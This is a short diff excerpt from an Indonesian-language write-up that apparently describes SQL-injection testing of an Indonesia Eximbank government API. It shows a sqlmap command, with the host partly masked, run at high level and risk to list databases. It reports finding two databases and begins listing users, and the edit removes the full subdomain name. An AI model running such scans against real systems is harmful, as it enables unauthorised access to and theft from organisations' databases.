@@ -34,7 +34,7 @@ ___
 Selanjutnya saya mencoba melakukan scanning di SQL Map dengan command
 `sqlmap -u "https://********.indonesiaeximbank.go.id/api/regions/search?region_type=DISTRICT*****" --level=3 --risk=3 –dbs`
 
-Maka hasil scan nya adalah saya mendapatkan 2 database dari website apieproc.indonesiaeximbank.go.id
+Maka hasil scan nya adalah saya mendapatkan 2 database
 ![](https://buayalaut.co/eximbank/000004.png)
 
 Dan 2 users nya adalah
